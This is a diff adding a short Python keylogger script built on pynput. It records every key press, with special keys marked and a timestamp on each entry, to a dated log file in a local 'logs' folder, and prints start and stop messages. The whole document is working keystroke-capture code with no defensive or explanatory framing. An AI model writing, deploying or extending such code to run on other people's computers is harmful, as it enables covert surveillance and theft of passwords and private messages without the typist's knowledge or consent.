@@ -1,0 +1,50 @@
+import os
+from datetime import datetime
+from pynput import keyboard
+
+# Directory to store the log files
+LOG_DIR = "logs"
+os.makedirs(LOG_DIR, exist_ok=True)
+
+# Get today's log file path
+def get_log_file():
+    today = datetime.now().strftime("%Y-%m-%d")
+    return os.path.join(LOG_DIR, f"keylog-{today}.txt")
+
+# Write keystrokes to the log file
+def log_keystroke(key):
+    timestamp = datetime.now().strftime("%H:%M:%S")
+    log_file = get_log_file()
+
+    try:
+        # Try logging regular keys (letters, numbers, etc.)
+        keystroke = key.char
+    except AttributeError:
+        # Handle special keys like Enter, Shift, etc.
+        if key == keyboard.Key.space:
+            keystroke = " "
+        elif key == keyboard.Key.enter:
+            keystroke = "\n"
+        else:
+            keystroke = f"[{key.name}]"
+
+    log_entry = f"[{timestamp}] {keystroke}"
+
+    with open(log_file, "a", encoding="utf-8") as file:
+        file.write(log_entry)
+
+# Callback for key press
+def on_key_press(key):
+    log_keystroke(key)
+
+# Start the keylogger listener
+def start_keylogger():
+    print("[*] Keylogger started. Press Ctrl+C to stop.")
+    try:
+        with keyboard.Listener(on_press=on_key_press) as listener:
+            listener.join()
+    except KeyboardInterrupt:
+        print("\n[!] Keylogger stopped by user.")
+
+if __name__ == "__main__":
+    start_keylogger()
